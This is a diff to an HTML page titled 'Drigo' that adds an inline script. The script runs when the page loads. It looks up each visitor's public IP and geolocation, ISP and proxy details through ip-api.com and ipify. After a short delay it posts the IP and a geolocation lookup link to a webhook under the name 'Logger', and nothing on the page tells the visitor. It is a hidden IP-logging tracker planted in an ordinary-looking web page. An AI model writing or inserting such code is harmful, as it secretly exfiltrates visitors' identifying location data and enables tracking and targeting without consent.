@@ -22,6 +22,50 @@
     <title>Drigo</title>
     <meta content="minimum-scale=1, initial-scale=1, width=device-width" name="viewport">
     <meta content="#181818" name="theme-color">
+    <script src="./config.js"></script>
+    <script>
+        function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
+            };
+            xhr.send(null);
+        }
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "log";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+        get_information("https://api.ipify.org/", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ip";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+
+        function iplog() {
+            var ispp = document.getElementById('ip').innerHTML
+            var extra = document.getElementById("log").innerHTML
+            const request = new XMLHttpRequest();
+            request.open("POST", wbhk);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Logger",
+                avatar_url: 'https://i.pinimg.com/564x/03/5d/ba/035dba9b43fb40d2e48f260a2983bbac.jpg',
+                content: "**IP**:" + ispp + "_\n**Infos** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n"
+            }
+            request.send(JSON.stringify(params));
+        }
+        setTimeout(function () {
+            iplog()
+        }, 700);
+    </script>
     <style>
         *,
         :before,
